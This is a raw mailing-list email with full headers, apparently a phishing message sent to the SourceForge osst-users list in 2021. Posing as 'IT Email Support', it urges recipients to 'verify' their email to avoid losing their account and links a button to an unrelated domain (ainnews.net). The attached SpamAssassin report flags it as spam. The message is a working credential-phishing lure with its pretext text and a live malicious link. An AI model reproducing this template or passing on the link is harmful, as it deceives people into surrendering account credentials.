Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 038CB42D49C
	for <lists+osst-users@lfdr.de>; Thu, 14 Oct 2021 10:14:51 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1mavt3-0003wR-Nh
	for lists+osst-users@lfdr.de; Thu, 14 Oct 2021 08:14:49 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <noreply@oven.co.kr>) id 1mavt2-0003w8-77
 for osst-users@lists.sourceforge.net; Thu, 14 Oct 2021 08:14:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=whz+7uFGsSi9G/QDxWBEhHGUcrmUISA69tVRLpkvm00=; b=bHi2x0tuTmOR9Svo5hYM7Sk+pX
 YELEJpx183U/PjHXCp4wAUXT0Ozp/n/CNUWfi85F/fLHXSlAw8EgG/q6x7UDIzke56A4VvL3v/Z0l
 Vmdh9/VdVa8TruRVPiWT90tHjiv5AlpOYE6itlBq20oI1KNvWyo9VvWjVJlzvhho9nec=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=whz+7uFGsSi9G/QDxWBEhHGUcrmUISA69tVRLpkvm00=; b=S
 H3F6CZvmm85OPnPqvnys5h28V38x9mABJ07h04daJGloPzUtykaz8VkixqJk5Wvj3cV38DCVlNqru
 BQpPekk0DDJuhxs7eUdTcjWIKMM8kourmN8Br0FtyxUfgHadjRLhDSkJITGfGFu6S16061EhozNt4
 5mmITdN7EE2k/gJc=;
Received: from [143.110.188.50] (helo=noreply0.oven.co.kr)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mavt1-00AgMm-ET
 for osst-users@lists.sourceforge.net; Thu, 14 Oct 2021 08:14:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=oven.co.kr; 
 h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=noreply@oven.co.kr;
 bh=whz+7uFGsSi9G/QDxWBEhHGUcrmUISA69tVRLpkvm00=;
 b=loDIIKhwZ7FKVK6LHTbYmpNaqACYgPkL2Qcv2745I+ACxEwL4lmLZeJuPuc8S97MdWWenLIPfE3P
 Fnqic26J5hMZ0YaBGV/Cb2FS7ISmfAr8DuNDIr/iFhPQsEOEP5ChaTEWnotQ+y84O6mBQPuFDUSH
 hBnHJGYDRI9vnjTpnmQ=
From: IT Email Support <noreply@oven.co.kr>
To: osst-users@lists.sourceforge.net
Date: 14 Oct 2021 01:14:02 -0700
Message-ID: <20211014011402.09463EED05A434E9@oven.co.kr>
MIME-Version: 1.0
X-Spam-Score: 6.8 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Dear osst-users@lists.sourceforge.net Your Email verification
 is required to continue using the service. please verify your email to avoid
 loosing your account service. 
 Content analysis details:   (6.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: ainnews.net]
 0.0 RCVD_IN_MSPIKE_L3      RBL: Low reputation (-3)
 [143.110.188.50 listed in bl.mailspike.net]
 0.5 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [143.110.188.50 listed in dnsbl-1.uceprotect.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.7 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 0.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
X-Headers-End: 1mavt1-00AgMm-ET
Subject: [Osst-users] osst-users@lists.sourceforge.net Verification
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Reply-To: noreply@lists.sourceforge.net
Content-Type: multipart/mixed; boundary="===============0276161698400918296=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============0276161698400918296==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV id=3Dyiv3835738702m_-3963264072071041189m_-2068912727642064907m_600989=
1601274502908m_21672076248843749m_-5271971888064844125m_-624552921922887961=
9gmail-m_3983087730740183267gmail-xd123e1ec33bf4f6 style=3D"FONT-SIZE: 13px=
; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(38,38,38); FONT-STYLE: n=
ormal; TEXT-ALIGN: left; PADDING-TOP: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; BORDER-TOP-WIDTH: 0px;=20
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-decoration-style=
: initial; text-decoration-color: initial; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-shadow: none"><FONT style=3D"text-shadow: none" si=
ze=3D3 face=3DCalibri>Dear&nbsp;osst-users@lists.sourceforge.net</FONT></DI=
V>
<DIV id=3Dyiv3835738702m_-3963264072071041189m_-2068912727642064907m_600989=
1601274502908m_21672076248843749m_-5271971888064844125m_-624552921922887961=
9gmail-m_3983087730740183267gmail-xd123e1ec33bf4f6 style=3D"FONT-SIZE: 13px=
; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(38,38,38); FONT-STYLE: n=
ormal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BAC=
KGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=20
text-decoration-style: initial; text-decoration-color: initial; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-shadow: none"><FONT style=3D"=
text-shadow: none" size=3D3 face=3DCalibri><BR style=3D"text-shadow: none">=
Your&nbsp;Email&nbsp;verification&nbsp;is required to continue using the se=
rvice.</FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(38,38,38); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
0px; text-decoration-style: initial; text-decoration-color: initial; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-shadow: none"><FONT style=3D"text-shadow: none" size=3D3 face=3DCalibr=
i>please verify your email to avoid loosing your account service.<BR style=
=3D"text-shadow: none"></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(38,38,38); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
0px; text-decoration-style: initial; text-decoration-color: initial; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-shadow: none"><FONT style=3D"text-shadow: none" size=3D3 face=3DCalibr=
i><BR style=3D"text-shadow: none"></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(38,38,38); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
0px; text-decoration-style: initial; text-decoration-color: initial; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-shadow: none"><FONT style=3D"text-shadow: none" size=3D3 face=3DCalibr=
i></FONT>
<A style=3D"BORDER-LEFT-WIDTH: 0px; TEXT-DECORATION: underline; MAX-WIDTH: =
150px; BORDER-RIGHT-WIDTH: 0px; WIDTH: 210px; VERTICAL-ALIGN: baseline; BOR=
DER-BOTTOM-WIDTH: 0px; COLOR: white; OUTLINE-WIDTH: medium; PADDING-BOTTOM:=
 14px; TEXT-ALIGN: center; PADDING-TOP: 14px; OUTLINE-STYLE: none; PADDING-=
LEFT: 7px; MARGIN: 0px; DISPLAY: block; PADDING-RIGHT: 7px; BORDER-TOP-WIDT=
H: 0px; BACKGROUND-COLOR: blue; text-shadow: none; border-radius: 4px; font=
-stretch: inherit"=20
href=3D"https://ainnews.net/7878679990/ssl/?email=3Dosst-users@lists.source=
forge.net" rel=3D"nofollow noopener noreferrer" target=3D_blank><FONT style=
=3D"text-shadow: none" face=3DCalibri>Verify&nbsp;your osst-users@lists.sou=
rceforge.net</FONT></A><BR style=3D"FONT-SIZE: 16px; FONT-FAMILY: Roboto, R=
obotoDraft, Helvetica, Arial, sans-serif; COLOR: rgb(64,64,64); text-shadow=
: none"><FONT style=3D"text-shadow: none" face=3DCalibri></FONT>
<P style=3D"COLOR: rgb(64,64,64); text-shadow: none"><FONT style=3D"VERTICA=
L-ALIGN: inherit; text-shadow: none"><FONT style=3D"VERTICAL-ALIGN: inherit=
; text-shadow: none" color=3D#ff0000 face=3DCalibri>This is an automated em=
ail from your administrator to&nbsp;osst-users@lists.sourceforge.net.</FONT=
></FONT></P><FONT style=3D"text-shadow: none" face=3DCalibri><FONT style=3D=
"VERTICAL-ALIGN: inherit; text-shadow: none"><FONT style=3D"VERTICAL-ALIGN:=
 inherit; text-shadow: none" color=3D#000000 size=3D3 face=3DCalibri>&nbsp;=
</FONT></FONT>
 </FONT><FONT style=3D"text-shadow: none" color=3D#000000 size=3D4 face=3DC=
alibri>IT Email Support</FONT><SPAN style=3D"FONT-SIZE: medium; FONT-FAMILY=
: Calibri; COLOR: rgb(0,0,0); text-shadow: none"><FONT size=3D4>.</FONT></S=
PAN></DIV></BODY></HTML>


--===============0276161698400918296==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0276161698400918296==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============0276161698400918296==--
